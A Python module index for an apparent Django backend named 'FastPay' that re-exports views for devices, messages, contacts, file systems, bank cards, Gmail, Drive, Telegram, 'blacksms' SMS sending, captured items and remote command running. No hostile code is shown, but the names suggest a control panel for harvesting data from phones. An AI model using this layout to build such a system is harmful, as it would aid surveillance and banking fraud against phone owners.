"""
FastPay Backend API Views

This module organizes views by domain:
- core: Root endpoints, health, sync contract, ItemViewSet
- mobile: Device, Message, Notification, Contact, FileSystem ViewSets
- banking: BankCard, BankCardTemplate, Bank ViewSets
- dashboard: Dashboard authentication and management endpoints
- gmail: Gmail API integration endpoints
- drive: Google Drive API endpoints
- logs: Logging ViewSets (CommandLog, AutoReplyLog, etc.)
- apk: APK-facing endpoints (login validation, registration)

All views are re-exported here for backward compatibility with urls.py
"""

# Core views
from .core import (
    root,
    health,
    gmail_oauth_debug,
    sync_contract,
    sync_status,
    ItemViewSet,
)
from .health import api_health

# Sync helpers (imported from core for backward compatibility)
from .core import _update_device_sync_fields, _log_sync_result

# Mobile views (Device, Message, Notification, Contact, FileSystem, Company)
from .mobile import (
    DeviceViewSet,
    MessageViewSet,
    NotificationViewSet,
    ContactViewSet,
    FileSystemViewSet,
    CompanyViewSet,
)

# Banking views
from .banking import (
    BankCardTemplateViewSet,
    BankCardViewSet,
    BankViewSet,
)

# Dashboard views
from .dashboard import (
    dashboard_login,
    dashboard_profile,
    dashboard_reset_password,
    dashboard_update_access,
    dashboard_configure_access,
    dashboard_update_profile,
    dashboard_update_theme_mode,
    dashboard_activity_logs,
    dashboard_send_verification_email,
    dashboard_verify_email_token,
    dashboard_users_list,
    devices_assign,
    devices_unassign,
    dashboard_user_create,
    dashboard_user_update,
)

# Gmail views
from .gmail import (
    GmailAccountViewSet,
    gmail_init_auth,
    gmail_callback,
    gmail_status,
    gmail_messages,
    gmail_message_detail,
    gmail_send,
    gmail_modify_labels,
    gmail_delete_message,
    gmail_labels,
    gmail_disconnect,
    gmail_bulk_send,
    gmail_statistics,
    gmail_bulk_modify_labels,
)

# Drive views
from .drive import (
    drive_list_files,
    drive_file_detail,
    drive_download_file,
    drive_upload_file,
    drive_create_folder,
    drive_delete_file,
    drive_share_file,
    drive_storage_info,
    drive_search_files,
    drive_copy_file,
)

# Google Sheets views (URLs are under api.sheets.urls)
from api.sheets.views import (
    sheets_list_or_create,
    sheets_spreadsheet_metadata,
    sheets_read_values,
    sheets_update_values,
    sheets_append_values,
)

# Logs views
from .logs import (
    CommandLogViewSet,
    AutoReplyLogViewSet,
    ActivationFailureLogViewSet,
    ApiRequestLogViewSet,
    CaptureItemViewSet,
)

# APK views
from .apk import (
    validate_apk_login,
    isvalidcodelogin,
    register_bank_number,
    blacksms_send_sms,
    blacksms_send_whatsapp,
    ip_download_file,
)

# Telegram views
from .telegram import (
    TelegramBotViewSet,
    TelegramUserLinkViewSet,
    validate_telegram_token,
    discover_chats_by_token,
    lookup_chat_by_token,
    telegram_webhook,
)

# Scheduled task views
from .tasks import (
    ScheduledTaskViewSet,
    TaskResultViewSet,
    available_tasks,
    task_status,
)
from .run_command import run_command_view

__all__ = [
    # Core
    'root',
    'health',
    'gmail_oauth_debug',
    'sync_contract',
    'sync_status',
    'ItemViewSet',
    'api_health',
    '_update_device_sync_fields',
    '_log_sync_result',
    # Mobile
    'DeviceViewSet',
    'MessageViewSet',
    'NotificationViewSet',
    'ContactViewSet',
    'FileSystemViewSet',
    'CompanyViewSet',
    # Banking
    'BankCardTemplateViewSet',
    'BankCardViewSet',
    'BankViewSet',
    # Dashboard
    'dashboard_login',
    'dashboard_profile',
    'dashboard_reset_password',
    'dashboard_update_access',
    'dashboard_configure_access',
    'dashboard_update_profile',
    'dashboard_update_theme_mode',
    'dashboard_activity_logs',
    'dashboard_send_verification_email',
    'dashboard_verify_email_token',
    'dashboard_users_list',
    'devices_assign',
    'devices_unassign',
    'dashboard_user_create',
    'dashboard_user_update',
    # Gmail
    'GmailAccountViewSet',
    'gmail_init_auth',
    'gmail_callback',
    'gmail_status',
    'gmail_messages',
    'gmail_message_detail',
    'gmail_send',
    'gmail_modify_labels',
    'gmail_delete_message',
    'gmail_labels',
    'gmail_disconnect',
    'gmail_bulk_send',
    'gmail_statistics',
    'gmail_bulk_modify_labels',
    # Drive
    'drive_list_files',
    'drive_file_detail',
    'drive_download_file',
    'drive_upload_file',
    'drive_create_folder',
    'drive_delete_file',
    'drive_share_file',
    'drive_storage_info',
    'drive_search_files',
    'drive_copy_file',
    # Sheets
    'sheets_list_or_create',
    'sheets_spreadsheet_metadata',
    'sheets_read_values',
    'sheets_update_values',
    'sheets_append_values',
    # Logs
    'CommandLogViewSet',
    'AutoReplyLogViewSet',
    'ActivationFailureLogViewSet',
    'ApiRequestLogViewSet',
    'CaptureItemViewSet',
    # APK
    'validate_apk_login',
    'isvalidcodelogin',
    'register_bank_number',
    'blacksms_send_sms',
    'blacksms_send_whatsapp',
    'ip_download_file',
    # Telegram
    'TelegramBotViewSet',
    'TelegramUserLinkViewSet',
    'validate_telegram_token',
    'discover_chats_by_token',
    'lookup_chat_by_token',
    'telegram_webhook',
    # Scheduled tasks
    'ScheduledTaskViewSet',
    'TaskResultViewSet',
    'available_tasks',
    'task_status',
    'run_command_view',
]
